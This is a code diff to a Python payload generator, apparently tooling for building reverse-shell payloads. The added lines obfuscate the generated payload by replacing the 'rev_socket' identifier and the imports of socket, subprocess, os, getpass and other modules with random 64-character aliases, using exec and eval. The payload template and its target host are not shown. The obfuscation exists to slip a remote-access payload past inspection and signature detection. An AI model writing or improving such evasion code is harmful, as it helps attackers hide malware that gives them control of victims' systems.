@@ -93,7 +93,15 @@ class Payload:
         if self.obfuscate == 'yes':
             for i in range(5):
                 payload = f'{secrets.token_bytes()}\n' + payload
+            global letters
             letters = string.ascii_letters
+            rev_socket = ''.join(secrets.choice(letters) for i in range(64))
+            payload = payload.replace('rev_socket', rev_socket)
+            libraries = ['socket', 'subprocess', 'os', 'codecs', 'json', 'platform', 'getpass', 're']
+            for library in libraries:
+                exec(f'global {library}_import; {library}_import = "".join(secrets.choice(letters) for i in range(64))')
+                payload = payload.replace(f'import {library}', f'import {library} as {eval(f"{library}_import")}')
+                payload = payload.replace(f'{library}.', f"{eval(f'{library}_import')}.")
             handler = ''.join(secrets.choice(letters) for i in range(64))
             if self.encryption == 'hex':
                 payload = payload.replace('hex_handler', handler)
@@ -101,8 +109,6 @@ class Payload:
                 payload = payload.replace('base64_hander', handler)
             new_text = ''.join(secrets.choice(letters) for i in range(64))
             payload = payload.replace('new_text', new_text)
-            rev_socket = ''.join(secrets.choice(letters) for i in range(64))
-            payload = payload.replace('rev_socket', rev_socket)
             command = ''.join(secrets.choice(letters) for i in range(64))
             payload = payload.replace('command', command)
             output = ''.join(secrets.choice(letters) for i in range(64))
